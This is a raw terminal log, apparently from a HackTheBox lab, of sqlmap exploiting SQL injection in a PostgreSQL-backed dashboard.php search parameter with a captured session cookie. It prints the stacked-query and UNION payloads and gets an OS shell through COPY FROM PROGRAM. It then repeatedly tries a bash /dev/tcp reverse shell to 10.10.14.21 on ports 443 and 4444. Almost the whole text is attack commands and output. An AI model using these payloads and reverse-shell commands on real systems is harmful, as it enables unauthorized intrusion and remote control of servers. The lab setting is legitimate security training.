[22:45:08] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[22:45:09] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[22:45:10] [INFO] testing 'Generic inline queries'
[22:45:10] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[22:45:11] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[22:45:11] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[22:45:12] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[22:45:12] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[22:45:13] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[22:45:14] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] 

[22:45:16] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[22:45:16] [WARNING] GET parameter 'search' does not seem to be injectable
[22:45:16] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'

[*] ending @ 22:45:16 /2025-07-27/

                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ sqlmap -u 'http://10.129.120.3/dashboard.php?search=any+query' -- cookie="PHPSESSID=h3vh8re0726sti8a5sijbgm03s" 
        ___
       __H__                                                                                                                                 
 ___ ___[.]_____ ___ ___  {1.9.4#stable}                                                                                                     
|_ -| . [(]     | .'| . |                                                                                                                    
|___|_  [)]_|_|_|__,|  _|                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                 

[!] detected usage of long-option without a starting hyphen ('cookie=PHPSESSID=h3vh8re0726sti8a5sijbgm03s')
                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ sqlmap -u 'http://10.129.120.3/dashboard.php?search=any+query' --cookie="PHPSESSID=h3vh8re0726sti8a5sijbgm03s" 
        ___
       __H__                                                                                                                                 
 ___ ___[)]_____ ___ ___  {1.9.4#stable}                                                                                                     
|_ -| . [,]     | .'| . |                                                                                                                    
|___|_  ["]_|_|_|__,|  _|                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:46:31 /2025-07-27/

[22:46:31] [INFO] testing connection to the target URL
[22:46:31] [INFO] testing if the target URL content is stable
[22:46:31] [INFO] target URL content is stable
[22:46:31] [INFO] testing if GET parameter 'search' is dynamic
[22:46:32] [WARNING] GET parameter 'search' does not appear to be dynamic
[22:46:32] [WARNING] heuristic (basic) test shows that GET parameter 'search' might not be injectable
[22:46:32] [INFO] testing for SQL injection on GET parameter 'search'
[22:46:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[22:46:32] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[22:46:32] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[22:46:33] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[22:46:33] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[22:46:33] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[22:46:34] [INFO] testing 'Generic inline queries'
[22:46:34] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[22:46:44] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable 
it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 

for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] 

[22:46:47] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[22:46:47] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[22:46:47] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[22:46:47] [WARNING] reflective value(s) found and filtering out
[22:46:47] [INFO] target URL appears to have 5 columns in query
[22:46:48] [INFO] GET parameter 'search' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 

sqlmap identified the following injection point(s) with a total of 49 HTTP(s) requests:
---
Parameter: search (GET)
    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: search=any query';SELECT PG_SLEEP(5)--

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: search=any query' UNION ALL SELECT NULL,NULL,NULL,(CHR(113)||CHR(98)||CHR(98)||CHR(106)||CHR(113))||(CHR(107)||CHR(98)||CHR(87)||CHR(99)||CHR(110)||CHR(86)||CHR(76)||CHR(71)||CHR(99)||CHR(111)||CHR(81)||CHR(72)||CHR(78)||CHR(74)||CHR(112)||CHR(98)||CHR(90)||CHR(80)||CHR(89)||CHR(66)||CHR(89)||CHR(66)||CHR(107)||CHR(90)||CHR(105)||CHR(98)||CHR(81)||CHR(76)||CHR(114)||CHR(114)||CHR(117)||CHR(117)||CHR(89)||CHR(104)||CHR(65)||CHR(82)||CHR(90)||CHR(82)||CHR(68)||CHR(117))||(CHR(113)||CHR(112)||CHR(120)||CHR(98)||CHR(113)),NULL-- yViI
---
[22:46:48] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
[22:46:49] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.129.120.3'

[*] ending @ 22:46:49 /2025-07-27/

                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ sqlmap -u 'http://10.129.120.3/dashboard.php?search=any+query' --cookie="PHPSESSID=h3vh8re0726sti8a5sijbgm03s"--os-shell
        ___
       __H__                                                                                                                                 
 ___ ___[(]_____ ___ ___  {1.9.4#stable}                                                                                                     
|_ -| . [,]     | .'| . |                                                                                                                    
|___|_  [']_|_|_|__,|  _|                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:47:43 /2025-07-27/

[22:47:44] [INFO] resuming back-end DBMS 'postgresql' 
[22:47:44] [INFO] testing connection to the target URL
got a 302 redirect to 'http://10.129.120.3/index.php'. Do you want to follow? [Y/n] 

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (GET)
    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: search=any query';SELECT PG_SLEEP(5)--

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: search=any query' UNION ALL SELECT NULL,NULL,NULL,(CHR(113)||CHR(98)||CHR(98)||CHR(106)||CHR(113))||(CHR(107)||CHR(98)||CHR(87)||CHR(99)||CHR(110)||CHR(86)||CHR(76)||CHR(71)||CHR(99)||CHR(111)||CHR(81)||CHR(72)||CHR(78)||CHR(74)||CHR(112)||CHR(98)||CHR(90)||CHR(80)||CHR(89)||CHR(66)||CHR(89)||CHR(66)||CHR(107)||CHR(90)||CHR(105)||CHR(98)||CHR(81)||CHR(76)||CHR(114)||CHR(114)||CHR(117)||CHR(117)||CHR(89)||CHR(104)||CHR(65)||CHR(82)||CHR(90)||CHR(82)||CHR(68)||CHR(117))||(CHR(113)||CHR(112)||CHR(120)||CHR(98)||CHR(113)),NULL-- yViI
---
[22:47:45] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 19.10 or 20.04 or 20.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
[22:47:45] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.129.120.3'

[*] ending @ 22:47:45 /2025-07-27/

                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ sqlmap -u 'http://10.129.120.3/dashboard.php?search=any+query' --cookie="PHPSESSID=h3vh8re0726sti8a5sijbgm03s"--os-shell
        ___
       __H__                                                                                                                                 
 ___ ___[']_____ ___ ___  {1.9.4#stable}                                                                                                     
|_ -| . [)]     | .'| . |                                                                                                                    
|___|_  [)]_|_|_|__,|  _|                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:48:17 /2025-07-27/

[22:48:17] [INFO] resuming back-end DBMS 'postgresql' 
[22:48:17] [INFO] testing connection to the target URL
got a 302 redirect to 'http://10.129.120.3/index.php'. Do you want to follow? [Y/n] 

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (GET)
    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: search=any query';SELECT PG_SLEEP(5)--

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: search=any query' UNION ALL SELECT NULL,NULL,NULL,(CHR(113)||CHR(98)||CHR(98)||CHR(106)||CHR(113))||(CHR(107)||CHR(98)||CHR(87)||CHR(99)||CHR(110)||CHR(86)||CHR(76)||CHR(71)||CHR(99)||CHR(111)||CHR(81)||CHR(72)||CHR(78)||CHR(74)||CHR(112)||CHR(98)||CHR(90)||CHR(80)||CHR(89)||CHR(66)||CHR(89)||CHR(66)||CHR(107)||CHR(90)||CHR(105)||CHR(98)||CHR(81)||CHR(76)||CHR(114)||CHR(114)||CHR(117)||CHR(117)||CHR(89)||CHR(104)||CHR(65)||CHR(82)||CHR(90)||CHR(82)||CHR(68)||CHR(117))||(CHR(113)||CHR(112)||CHR(120)||CHR(98)||CHR(113)),NULL-- yViI
---
[22:48:19] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 19.10 or 20.10 or 20.04 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
[22:48:19] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.129.120.3'

[*] ending @ 22:48:19 /2025-07-27/

                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ sqlmap -u 'http://10.129.120.3/dashboard.php?search=any+query' --cookie="PHPSESSID=h3vh8re0726sti8a5sijbgm03s" --os-shell
        ___
       __H__                                                                                                                                 
 ___ ___[']_____ ___ ___  {1.9.4#stable}                                                                                                     
|_ -| . [(]     | .'| . |                                                                                                                    
|___|_  [,]_|_|_|__,|  _|                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:48:44 /2025-07-27/

[22:48:45] [INFO] resuming back-end DBMS 'postgresql' 
[22:48:45] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (GET)
    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: search=any query';SELECT PG_SLEEP(5)--

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: search=any query' UNION ALL SELECT NULL,NULL,NULL,(CHR(113)||CHR(98)||CHR(98)||CHR(106)||CHR(113))||(CHR(107)||CHR(98)||CHR(87)||CHR(99)||CHR(110)||CHR(86)||CHR(76)||CHR(71)||CHR(99)||CHR(111)||CHR(81)||CHR(72)||CHR(78)||CHR(74)||CHR(112)||CHR(98)||CHR(90)||CHR(80)||CHR(89)||CHR(66)||CHR(89)||CHR(66)||CHR(107)||CHR(90)||CHR(105)||CHR(98)||CHR(81)||CHR(76)||CHR(114)||CHR(114)||CHR(117)||CHR(117)||CHR(89)||CHR(104)||CHR(65)||CHR(82)||CHR(90)||CHR(82)||CHR(68)||CHR(117))||(CHR(113)||CHR(112)||CHR(120)||CHR(98)||CHR(113)),NULL-- yViI
---
[22:48:45] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
[22:48:45] [INFO] fingerprinting the back-end DBMS operating system
[22:48:45] [INFO] the back-end DBMS operating system is Linux
[22:48:45] [INFO] testing if current user is DBA
[22:48:46] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
[22:48:46] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> 
os-shell> ls
do you want to retrieve the command standard output? [Y/n/a] 

command standard output:
---
base
global
pg_commit_ts
pg_dynshmem
pg_logical
pg_multixact
pg_notify
pg_replslot
pg_serial
pg_snapshots
pg_stat
pg_stat_tmp
pg_subtrans
pg_tblspc
pg_twophase
PG_VERSION
pg_wal
pg_xact
postgresql.auto.conf
postmaster.opts
postmaster.pid
---
os-shell> ls
do you want to retrieve the command standard output? [Y/n/a] 

command standard output:
---
base
global
pg_commit_ts
pg_dynshmem
pg_logical
pg_multixact
pg_notify
pg_replslot
pg_serial
pg_snapshots
pg_stat
pg_stat_tmp
pg_subtrans
pg_tblspc
pg_twophase
PG_VERSION
pg_wal
pg_xact
postgresql.auto.conf
postmaster.opts
postmaster.pid
---
os-shell> 
[22:48:57] [ERROR] user aborted
os-shell> exit
[22:48:59] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.129.120.3'

[*] ending @ 22:48:59 /2025-07-27/

                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ sqlmap -u 'http://10.129.120.3/dashboard.php?search=any+query' --cookie="PHPSESSID=h3vh8re0726sti8a5sijbgm03s" --os-shell
        ___
       __H__                                                                                                                                 
 ___ ___[(]_____ ___ ___  {1.9.4#stable}                                                                                                     
|_ -| . ["]     | .'| . |                                                                                                                    
|___|_  [)]_|_|_|__,|  _|                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:49:24 /2025-07-27/

[22:49:24] [INFO] resuming back-end DBMS 'postgresql' 
[22:49:24] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (GET)
    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: search=any query';SELECT PG_SLEEP(5)--

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: search=any query' UNION ALL SELECT NULL,NULL,NULL,(CHR(113)||CHR(98)||CHR(98)||CHR(106)||CHR(113))||(CHR(107)||CHR(98)||CHR(87)||CHR(99)||CHR(110)||CHR(86)||CHR(76)||CHR(71)||CHR(99)||CHR(111)||CHR(81)||CHR(72)||CHR(78)||CHR(74)||CHR(112)||CHR(98)||CHR(90)||CHR(80)||CHR(89)||CHR(66)||CHR(89)||CHR(66)||CHR(107)||CHR(90)||CHR(105)||CHR(98)||CHR(81)||CHR(76)||CHR(114)||CHR(114)||CHR(117)||CHR(117)||CHR(89)||CHR(104)||CHR(65)||CHR(82)||CHR(90)||CHR(82)||CHR(68)||CHR(117))||(CHR(113)||CHR(112)||CHR(120)||CHR(98)||CHR(113)),NULL-- yViI
---
[22:49:25] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 20.10 or 19.10 or 20.04 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
[22:49:25] [INFO] fingerprinting the back-end DBMS operating system
[22:49:25] [INFO] the back-end DBMS operating system is Linux
[22:49:25] [INFO] testing if current user is DBA
[22:49:25] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
[22:49:25] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> bach -c "bash -i >& /dev/tcp/10.10.14.21/443 0>&i"
do you want to retrieve the command standard output? [Y/n/a] 

[22:50:25] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[22:50:25] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
[22:50:26] [WARNING] the SQL query provided does not return any output
[22:50:26] [WARNING] time-based comparison requires larger statistical model, please wait......................... (done)                   
[22:50:27] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[22:50:28] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
No output
os-shell> bach -c "bash -i >& /dev/tcp/10.10.14.21/443 0>&1"
do you want to retrieve the command standard output? [Y/n/a] 

[22:51:16] [WARNING] the SQL query provided does not return any output
[22:51:16] [INFO] retrieved: 
No output
os-shell> bach -c "bash -i >& /dev/tcp/10.10.14.21/4444 0>&1"
do you want to retrieve the command standard output? [Y/n/a] 

[22:51:54] [WARNING] the SQL query provided does not return any output
[22:51:54] [INFO] retrieved: 
No output
os-shell> bach -c "bash -i >& /dev/tcp/{10.10.14.21}/4444 0>&1"
do you want to retrieve the command standard output? [Y/n/a] 

[22:52:13] [WARNING] the SQL query provided does not return any output
[22:52:13] [INFO] retrieved: 
No output
os-shell> bash -c "bash -i >& /dev/tcp/10.10.14.21/4444 0>&1"
do you want to retrieve the command standard output? [Y/n/a] 

[22:53:20] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[22:54:51] [CRITICAL] connection timed out to the target URL

[*] ending @ 22:54:51 /2025-07-27/

                                                                                                                                             
┌──(kali@kali)-[~/HTB]
└─$ sqlmap -u 'http://10.129.120.3/dashboard.php?search=any+query' --cookie="PHPSESSID=h3vh8re0726sti8a5sijbgm03s" --os-shell
        ___
       __H__                                                                                                                                 
 ___ ___[']_____ ___ ___  {1.9.4#stable}                                                                                                     
|_ -| . [)]     | .'| . |                                                                                                                    
|___|_  [,]_|_|_|__,|  _|                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:55:12 /2025-07-27/

[22:55:12] [INFO] resuming back-end DBMS 'postgresql' 
[22:55:12] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (GET)
    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: search=any query';SELECT PG_SLEEP(5)--

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: search=any query' UNION ALL SELECT NULL,NULL,NULL,(CHR(113)||CHR(98)||CHR(98)||CHR(106)||CHR(113))||(CHR(107)||CHR(98)||CHR(87)||CHR(99)||CHR(110)||CHR(86)||CHR(76)||CHR(71)||CHR(99)||CHR(111)||CHR(81)||CHR(72)||CHR(78)||CHR(74)||CHR(112)||CHR(98)||CHR(90)||CHR(80)||CHR(89)||CHR(66)||CHR(89)||CHR(66)||CHR(107)||CHR(90)||CHR(105)||CHR(98)||CHR(81)||CHR(76)||CHR(114)||CHR(114)||CHR(117)||CHR(117)||CHR(89)||CHR(104)||CHR(65)||CHR(82)||CHR(90)||CHR(82)||CHR(68)||CHR(117))||(CHR(113)||CHR(112)||CHR(120)||CHR(98)||CHR(113)),NULL-- yViI
---
[22:55:12] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 19.10 or 20.04 or 20.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
[22:55:12] [INFO] fingerprinting the back-end DBMS operating system
[22:55:12] [INFO] the back-end DBMS operating system is Linux
[22:55:12] [INFO] testing if current user is DBA
[22:55:12] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
[22:55:12] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> bash -c "bash -i >& /dev/tcp/10.10.14.21/4444 0>&1"
do you want to retrieve the command standard output? [Y/n/a] 

[22:56:03] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[22:57:26] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
No output
